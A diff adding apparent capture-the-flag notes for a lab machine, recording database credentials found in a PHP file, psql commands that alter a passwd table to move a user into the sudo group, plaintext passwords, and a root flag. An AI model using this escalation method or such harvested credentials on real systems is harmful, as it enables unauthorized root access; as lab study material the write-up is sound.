@@ -1,0 +1,49 @@
+#10.10.10.113
+--------------
+#after getting access through metasploit
+#inside web server /var/www/html found some php files and one hash
+
+#credential found inside /var/www/html/admin/pages/actions.php
+#dbname=unix 
+#USER=unixusrmgr 
+#PASS=dheu%7wjx8B&
+
+#port 5432 (postgresql) open , so there will be psql database
+--------------------------------------------------
+#POSTGRESQL DATABASE
+--------------------------------------------------
+#command to access postgresql database
+psql -h localhost -d unix -U unixusrmgr -W
+\l	        (list database)
+\c unix         (select database)
+\dt	        (list tables)
+q		(exit from table)
+select * from passwd_table;      (to check content inside tables)
+update passwd_table set gid=27 where gid=1001;	    (check below the reason to change gid of users to 27)
+update passwd_table set homedir='/root' where homedir='/var/jail/home'
+\q		(quit from psql)
+
+
+#now our user(ash) is also the part of root group
+#so we can run sudo command
+#change the system user to yourself
+su ash
+#PASSWD= i4tUHcqO  (ash's passwd)
+#then change to root your
+sudo su
+#PASSWD= i4tUHcqO  (ash's passwd)
+
+#Got Root
+++++++++++++++++++++++++++++++++++++++++++++++++++
+
+#key
+892a1f4d018e5d382c4f5ee1b26717a4
+
+
+*********************************
+#update group ID of ash(1001) user same as sudo(27)
+#check the group permission
+cat /etc/group
+#found sudo's gid=27
+#that's why change your users gid to 27 to get into sudoers group 
+**********************************
